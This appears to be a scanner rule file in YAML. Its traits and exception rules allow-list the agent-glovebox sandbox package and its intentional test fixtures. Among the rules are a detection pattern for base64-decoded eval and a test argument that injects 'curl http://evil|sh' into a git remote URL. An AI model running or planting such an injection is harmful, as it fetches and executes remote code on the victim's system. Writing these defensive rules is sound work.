# agent-glovebox — defensive AI-agent sandbox (AlexanderMattTurner/agent-glovebox).
# Ships staticscan_fixtures/ with intentional reverse-shell / eval payloads used to
# grade its own scanner; those vectors are test corpus, not executable malware.
defaults:
  platforms: [unix, windows]
  for: [manifests, scripts, source, documents, npm, tar]
  crit: notable
  conf: 0.99

traits:
  - id: package-name
    desc: agent-glovebox npm package name
    for: [package.json]
    size_min: 1
    if:
      type: value
      path: name
      exact: agent-glovebox

  - id: release-tree-path
    desc: Path under agent-glovebox release tree
    # Fires on every member of the published tarball so file-scoped unless
    # clauses can recognize defensive-scanner fixtures without archive pooling.
    # Basename-only matcher (≤2 '/' separators) so path-brittle stays green.
    # Include text/python/js: monitor-policy.txt, vendor redactor, and hook tests
    # all live under the release tree and need identity for unless: clauses.
    for: [scripts, source, manifests, json, package.json, plist, systemd-service, tar, npm, binaries, text, markdown, python, javascript, typescript]

    size_min: 1
    if:
      type: path
      regex: 'agent-glovebox-[0-9]'

  - id: upstream-repository
    desc: agent-glovebox GitHub upstream repository
    for: [package.json, javascript, typescript, python, json, shell, markdown, text]
    size_min: 1
    if:
      type: text
      substr: github.com/AlexanderMattTurner/agent-glovebox

  - id: glovebox-dir-env
    desc: agent-glovebox install directory env var
    for: [javascript, typescript, python, json, shell]
    size_min: 1
    if:
      type: text
      substr: _GLOVEBOX_DIR

  - id: glovebox-skip-monitor-flag
    desc: agent-glovebox monitor skip permission flag
    for: [json]
    size_min: 1
    if:
      type: text
      substr: GLOVEBOX_DANGEROUSLY_SKIP_MONITOR

  - id: staticscan-fixture-dirname
    desc: agent-glovebox staticscan fixture directory
    for: [python, javascript, typescript, shell]
    size_min: 1
    if:
      type: path
      dirname: true
      regex: '(^|[\\/])staticscan_fixtures([\\/]|$)'

  - id: eval-decoded-fixture-call
    desc: Scanner fixture evals base64-decoded payload
    for: [javascript, typescript]
    size_min: 1
    if:
      type: text
      regex: '(eval\(atob\(payload\)\))'

  - id: egress-framing-test-name
    desc: Glovebox egress framing test name
    for: [python]
    if:
      type: symbol
      kind: function
      exact: test_a_chunked_upload_is_ruled_on_the_guest_framing_not_envoys

  - id: workspace-hook-quoting-test
    desc: Workspace hook quoting test function
    for: [python]
    if:
      type: symbol
      kind: function
      exact: test_the_encoded_command_needs_no_shell_quoting

  - id: setup-remote-injection-test
    desc: Setup test adds injection payload as remote
    for: [python]
    if:
      type: symbol
      kind: call
      exact: _add_origin
      arg:
        index: 1
        exact: 'http://x/git/owner/repo";curl http://evil|sh;"'

composite_rules:
  - id: package-identity
    desc: Recognized agent-glovebox defensive sandbox package
    crit: notable
    conf: 0.99
    scope: outer
    needs: 2
    any:
      - id: package-name
      - id: release-tree-path
      - id: upstream-repository
      - id: glovebox-dir-env
      - id: glovebox-skip-monitor-flag

  # File-local: path under the published release tree, or the package.json name.
  - id: archive-context
    desc: agent-glovebox archive benign context
    crit: exception
    conf: 0.99
    for: [scripts, source, manifests, json, package.json, plist, systemd-service, tar, npm, binaries, text, markdown, python, javascript, typescript]

    any:
      - id: release-tree-path
      - id: package-name

  - id: glovebox-hook-settings-context
    desc: agent-glovebox SessionStart hook settings context
    crit: exception
    conf: 0.99
    for: [json]
    any:
      - id: glovebox-dir-env
      - id: glovebox-skip-monitor-flag

  - id: egress-framing-test-context
    desc: Glovebox local egress framing test
    for: [python]
    all:
      - id: release-tree-path
      - id: egress-framing-test-name

  - id: decoded-eval-fixture-context
    desc: Glovebox decoded eval scanner fixture
    for: [javascript, typescript]
    all:
      - id: release-tree-path
      - id: staticscan-fixture-dirname
      - id: eval-decoded-fixture-call

  - id: workspace-hook-quoting-test-context
    desc: Glovebox workspace hook quoting test
    for: [python]
    all:
      - id: release-tree-path
      - id: workspace-hook-quoting-test

  - id: setup-remote-injection-test-context
    desc: Glovebox setup remote injection test
    for: [python]
    all:
      - id: release-tree-path
      - id: setup-remote-injection-test
